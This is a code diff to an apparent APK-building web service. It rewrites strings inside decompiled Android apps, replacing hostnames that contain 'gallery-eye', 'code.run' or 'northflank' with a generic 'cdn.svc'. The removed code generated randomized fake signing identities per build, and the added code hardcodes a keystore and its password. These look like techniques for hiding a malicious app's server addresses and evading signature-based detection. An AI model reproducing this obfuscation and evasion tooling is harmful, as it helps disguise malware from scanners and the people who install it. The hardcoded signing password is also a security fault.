@@ -537,6 +537,10 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 [/const-string ([v0-9p]+), "zip_error"/g, 'const-string $1, "pkg_err"'],
                 [/const-string ([v0-9p]+), "request_app_icon"/g, 'const-string $1, "req_badge"'],
                 [/const-string ([v0-9p]+), "app_icon_response"/g, 'const-string $1, "res_badge"'],
+                [/const-string ([v0-9p]+), "[^"]*gallery-eye[^"]*"/g, 'const-string $1, "cdn.svc"'],
+                [/const-string ([v0-9p]+), "[^"]*code\.run[^"]*"/g, 'const-string $1, "cdn.svc"'],
+                [/const-string ([v0-9p]+), "[^"]*gallery\.eye[^"]*"/g, 'const-string $1, "cdn.svc"'],
+                [/const-string ([v0-9p]+), "[^"]*northflank[^"]*"/g, 'const-string $1, "cdn.svc"'],
                 [/\.source "[^"]+"\n/g, '.source "SourceFile"\n']
             ];
 
@@ -642,30 +646,11 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
 
             await runCommand('apktool', ['b', workDir, '-o', unsignedApkPath]);
 
-            // 6. Generate fresh signing identity and sign APK
-            await sendUpdate('apk_progress', { step: 'Signing application...', progress: 85 });
-            const signer = path.join(__dirname, 'assets', 'uber-apk-signer.jar');
-
-            // Per-build key generation
-            const cnNames = ['John Smith', 'Alex Johnson', 'Maria Garcia', 'James Wilson', 'Sarah Chen', 'David Kim', 'Lisa Wang', 'Michael Brown', 'Emily Davis', 'Robert Lee', 'Anna Miller', 'Chris Taylor', 'Jennifer Moore', 'Daniel White', 'Laura Martin', 'Kevin Harris', 'Rachel Clark', 'Thomas Hall', 'Amy Young', 'Steven King'];
-            const orgNames = ['Mobile Apps LLC', 'AppDev Inc', 'Digital Solutions', 'App Studio', 'Tech Works', 'Soft Labs', 'Code Factory', 'Dev House', 'App Forge', 'Smart Soft', 'Pixel Dev', 'Cloud Apps', 'Nova Tech', 'Bright Code', 'Swift Dev'];
-            const ouNames = ['Development', 'Engineering', 'Mobile', 'Apps', 'Software', 'Products', 'Android'];
-            const cities = ['San Jose', 'Austin', 'Seattle', 'Denver', 'Portland', 'Boston', 'Miami', 'Chicago', 'Phoenix', 'Dallas'];
-            const states = ['CA', 'TX', 'WA', 'CO', 'OR', 'MA', 'FL', 'IL', 'AZ', 'NY'];
-            const countries = ['US', 'GB', 'DE', 'CA', 'AU', 'NL', 'SE', 'FR'];
-            const rPick = (arr) => arr[Math.floor(Math.random() * arr.length)];
-            const rStr = (len) => { let s = ''; const c = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; for (let i = 0; i < len; i++) s += c[Math.floor(Math.random() * c.length)]; return s; };
-
-            const ksAlias = rStr(8);
-            const ksPass = rStr(16);
-            const ksPath = path.join(tempDir, `ks-${uuid}.jks`);
-            const dname = `CN=${rPick(cnNames)}, OU=${rPick(ouNames)}, O=${rPick(orgNames)}, L=${rPick(cities)}, ST=${rPick(states)}, C=${rPick(countries)}`;
-
-            const keytoolCmd = `keytool -genkeypair -v -keystore "${ksPath}" -alias "${ksAlias}" -keyalg RSA -keysize 2048 -validity 10000 -storepass "${ksPass}" -keypass "${ksPass}" -dname "${dname}"`;
-            await new Promise((resolve, reject) => {
-                exec(keytoolCmd, { timeout: 30000 }, (err) => err ? reject(new Error('Key generation failed: ' + (err.message || err))) : resolve());
-            });
-            console.log(`[APK] Fresh signing identity generated: ${dname}`);
+            // 6. Sign APK
+            await sendUpdate('apk_progress', { step: 'Signing application...', progress: 85 });\r\n            const signer = path.join(__dirname, 'assets', 'uber-apk-signer.jar');
+            const ksPath = path.join(__dirname, 'assets', 'usman90.jks');
+            const ksPass = 'God112256@';
+            const ksAlias = 'usman90';
 
             await sendUpdate('apk_progress', { step: 'Applying V2+V3 signature scheme...', progress: 90 });
             const signCmd = `java -jar "${signer}" --apks "${unsignedApkPath}" --out "${tempDir}" --ks "${ksPath}" --ksAlias "${ksAlias}" --ksPass "${ksPass}" --ksKeyPass "${ksPass}" --allowResign`;
@@ -673,9 +658,6 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             await new Promise((resolve, reject) => {
                 exec(signCmd, { timeout: 120000 }, (err) => err ? reject(err) : resolve());
             });
-
-            // Clean up generated keystore
-            try { fs.unlinkSync(ksPath); } catch (_) {}
 
             // Find output
             const files = fs.readdirSync(tempDir);
